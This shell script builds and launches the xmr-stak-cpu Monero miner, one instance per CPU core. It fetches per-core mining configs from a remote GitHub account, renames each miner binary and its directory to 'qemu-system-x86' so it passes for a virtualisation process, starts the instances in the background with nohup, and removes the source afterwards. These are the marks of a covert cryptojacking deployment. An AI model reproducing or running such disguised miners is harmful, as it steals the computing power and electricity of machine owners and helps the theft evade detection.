cpu_cnt=`cat /proc/cpuinfo | awk '/processor/ {print $3}' | wc -l`
#ht_enabled=``
if [  -z "$1" ]
then
        phycores=$(cat /proc/cpuinfo | egrep "core id|physical id" | tr -d "\n" | sed s/physical/\\nphysical/g | grep -v ^$ | sort | uniq | wc -l)
else
        phycores=$1
fi
echo $phycores
apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget
mkdir /usr/share/packages_download
workingdir=/usr/share/packages_download/
git clone https://github.com/fireice-uk/xmr-stak-cpu.git /usr/share/packages_download/qemu-system-x86
for (( core=0; core<$phycores; core++ )); do
        echo "core $core"
        cp -r /usr/share/packages_download/qemu-system-x86 /usr/share/packages_download/qemu-system-x86-$core
        cd $workingdir/qemu-system-x86-$core
        cmake .
        make install
        curl https://raw.githubusercontent.com/githubuserold/miner/master/cpu$core/config.txt > $workingdir/qemu-system-x86-$core/bin/config.txt
        mv $workingdir/qemu-system-x86-$core/bin/xmr-stak-cpu $workingdir/qemu-system-x86-$core/bin/qemu-system-x86
        cd $workingdir/qemu-system-x86-$core/bin/
        nohup ./qemu-system-x86 &
done
rm -r /usr/share/packages_download/qemu-system-x86
